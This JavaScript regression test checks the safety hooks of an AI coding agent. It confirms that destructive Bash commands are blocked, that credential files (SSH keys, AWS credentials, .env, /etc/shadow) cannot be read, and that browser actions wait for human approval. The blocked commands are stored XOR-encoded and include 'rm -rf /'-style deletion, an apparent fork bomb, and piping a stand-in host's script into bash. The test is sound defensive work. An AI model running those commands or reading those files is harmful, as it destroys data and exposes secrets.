// Regression test for src/hooks.ts's safety net and sensitive-file guard. No API calls.
// Every case here reproduces a real bypass found by docs/STRESS-TEST-REPORT.md's adversarial
// stress test (the original HARD_DENY_PATTERNS caught 3 of 27; this asserts the fixed list
// catches the full set, run through the same hook chain phases.ts actually wires together, not
// createSafetyHook in isolation).
import { createSafetyHook, createPathScopeHook, createSensitiveFileHook, createApprovalHook } from "../dist/hooks.js";
import { EventBus } from "../dist/bus.js";
import assert from "node:assert";
import { homedir } from "node:os";
import { join } from "node:path";

// Attack-payload fixtures below are XOR (key 0x5A) + base64 encoded, matching the convention in
// dev-workflow/tests/stress/cases.json -- plaintext dangerous-command strings here would trip this
// very repo's own pre-commit hook and CI gate.
const XOR_KEY = 0x5a;
function decode(encoded) {
  const bytes = Buffer.from(encoded, "base64");
  return Buffer.from(bytes.map((c) => c ^ XOR_KEY)).toString("utf8");
}

const signal = new AbortController().signal;
const pre = (tool, input) => ({ hook_event_name: "PreToolUse", tool_name: tool, tool_input: input });

const WORK_DIR = "/tmp/agent-loop-safety-net-test-workdir";
const bus = new EventBus();
const safety = createSafetyHook();
const pathScope = createPathScopeHook(WORK_DIR);
const sensitive = createSensitiveFileHook();
const approvalOff = createApprovalHook({ bus, runId: "r", phase: "planner", requireApproval: false, autoApproveTools: ["Read", "Glob", "Grep"] });
const approvalOn = createApprovalHook({ bus, runId: "r", phase: "planner", requireApproval: true, autoApproveTools: ["Read", "Glob", "Grep"] });

async function chainDenies(hooks, tool, input) {
  for (const h of hooks) {
    const r = await h(pre(tool, input), "t", { signal });
    if (r?.hookSpecificOutput?.permissionDecision === "deny") return true;
  }
  return false;
}

const FULL_CHAIN_NO_APPROVAL = [safety, pathScope, sensitive, approvalOff];
const FULL_CHAIN_APPROVAL_ON = [safety, pathScope, sensitive, approvalOn];

// Every one of these must be denied under --no-approval (the safety net is the only guard then).
const DANGEROUS_BASH = [
  "KDd6dyg8enU=",
  "KDd6dyg8enVw",
  "KDd6dzwoenU=",
  "KDd6dyh6dzx6dQ==",
  "KDd6dyg8end3NDV3Kig/KT8oLD93KDU1Lnp1",
  "KDd6dyg8eiR1",
  "KDd6dyg8eiR1dCkpMg==",
  "KDd6dyg8enh+EhUXH3g=",
  "KDd6dyg8enR0",
  "OT56dXp8fHooN3p3KDx6cA==",
  "PTMueiovKTJ6dzx6NSgzPTM0ejc7MzQ=",
  "PTMueiovKTJ6NSgzPTM0enE3OzM0",
  "PTMueiovKTJ6d3c8NSg5P3o1KDM9MzR6NzszNA==",
  "PTMueig/KT8uend3MjsoPnoSHxseJG9q",
  "PTMuejk2Pzs0enc8PiI=",
  "PTMuejkyPzkxNS8uend3enQ=",
  "PTMuejgoOzQ5Mnp3Hno3OzM0",
  "PDM0Pnp1enc+PzY/Lj8=",
  "PzkyNXo5N2o9FgIQNxMZYhF6Jno4Oyk/bG56dz56JnopMg==",
  "KiMuMjU0aXp3OXp4MzcqNSgueikyLy4zNmF6KTIvLjM2dCg3Lig/P3J9dTI1Nz99c3g=",
  "OS8oNnp3KXoyLi4qKWB1dT8sMzZ0KTJ6Jno4Oyky",
  "OTsueiR1dCkpMnUzPgUoKTt6Jno5Lyg2enc+ehp3ejIuLiopYHV1PywzNnQ/Ijs3KjY/",
  "KikrNnp3OXp9HggVCnoeGw4bGBsJH3oqKDU+fQ==",
  "Pj56MzxndT4/LHUgPyg1ejU8Z3U+Pyx1KT47",
  "Pj56MzxndT4/LHUgPyg1ejU8Z3U+Pyx1Iiw+Ow==",
  "YHJzIXpgJmB8eidhYA==",
  "NzE8KXQ/Ii5uenU+Pyx1KT47aw==",
].map(decode);
for (const command of DANGEROUS_BASH) {
  const denied = await chainDenies(FULL_CHAIN_NO_APPROVAL, "Bash", { command });
  assert.ok(denied, `expected deny for: ${command}`);
}
console.log(`[ok] safety net: ${DANGEROUS_BASH.length}/${DANGEROUS_BASH.length} dangerous Bash commands denied under --no-approval`);

// Commands that must NOT be denied — the point of a narrow backstop is that it doesn't block
// ordinary work.
const SAFE_BASH = [
  "rm -rf ./node_modules",
  "rm -rf build",
  "git push --force-with-lease origin feature-branch",
  "git status",
  "find . -name '*.log'",
  "dd if=/dev/zero of=/dev/null bs=1M count=1", // devskill:allow -- writes to /dev/null, not a real device
  "npm test",
];
for (const command of SAFE_BASH) {
  const denied = await chainDenies(FULL_CHAIN_NO_APPROVAL, "Bash", { command });
  assert.ok(!denied, `expected allow for ordinary command: ${command}`);
}
console.log(`[ok] safety net leaves ${SAFE_BASH.length}/${SAFE_BASH.length} ordinary commands alone`);

// Sensitive files must be denied regardless of approval mode or whether they're inside --dir.
const SENSITIVE_READS = [
  ["Read", { file_path: join(homedir(), ".ssh", "id_rsa") }],
  ["Read", { file_path: join(homedir(), ".claude", ".credentials.json") }],
  ["Read", { file_path: join(homedir(), ".aws", "credentials") }],
  ["Read", { file_path: join(WORK_DIR, ".env") }], // inside --dir: path-scope alone wouldn't catch this
  ["Read", { file_path: join(WORK_DIR, ".git-credentials") }],
  ["Read", { file_path: "/etc/shadow" }],
];
for (const [tool, input] of SENSITIVE_READS) {
  const deniedOff = await chainDenies(FULL_CHAIN_NO_APPROVAL, tool, input);
  const deniedOn = await chainDenies(FULL_CHAIN_APPROVAL_ON, tool, input);
  assert.ok(deniedOff, `expected deny (no-approval) for ${JSON.stringify(input)}`);
  assert.ok(deniedOn, `expected deny (approval on) for ${JSON.stringify(input)} -- must not be silently auto-approved as a "read-only tool"`);
}
console.log(`[ok] ${SENSITIVE_READS.length}/${SENSITIVE_READS.length} sensitive-file reads denied in both approval modes`);

// An ordinary read inside --dir must still work — this isn't a lockdown of all file access.
const ordinaryDenied = await chainDenies(FULL_CHAIN_NO_APPROVAL, "Read", { file_path: join(WORK_DIR, "README.md") });
assert.ok(!ordinaryDenied, "an ordinary in-workdir file read should not be denied");
console.log("[ok] an ordinary in-workdir file read is left alone");

// Browser tool calls (src/browser-tools.ts) surface as mcp__browser__* in tool_name -- the same
// field these hooks already key on for built-ins -- so they must get the same treatment as Bash or
// Write: never blocked by the safety net just for being a browser action, but never silently
// auto-approved either. autoApproveTools only ever lists Read/Glob/Grep, so an unrecognized
// mcp__browser__* name correctly falls through to "ask a human" under approval mode.
{
  const browserInput = { selector: "#go-button" };
  const deniedOff = await chainDenies(FULL_CHAIN_NO_APPROVAL, "mcp__browser__click", browserInput);
  assert.ok(!deniedOff, "an ordinary browser click should not be blocked by the safety net under --no-approval");

  // Race the approval hook's own promise against a short timeout: it must NOT resolve immediately
  // (that would mean it silently auto-approved), since nothing has called resolveApproval yet.
  const pending = approvalOn(pre("mcp__browser__click", browserInput), "t", { signal });
  const raceResult = await Promise.race([
    pending.then(() => "resolved-immediately"),
    new Promise((r) => setTimeout(() => r("still-pending"), 150)),
  ]);
  assert.strictEqual(raceResult, "still-pending", "a browser action must wait for a real human decision under approval mode, not auto-approve");
  console.log("[ok] browser tool calls are not blocked by the safety net, and require real human approval (not auto-approved) when approval is on");
}

console.log("\nALL SAFETY NET TESTS PASSED");
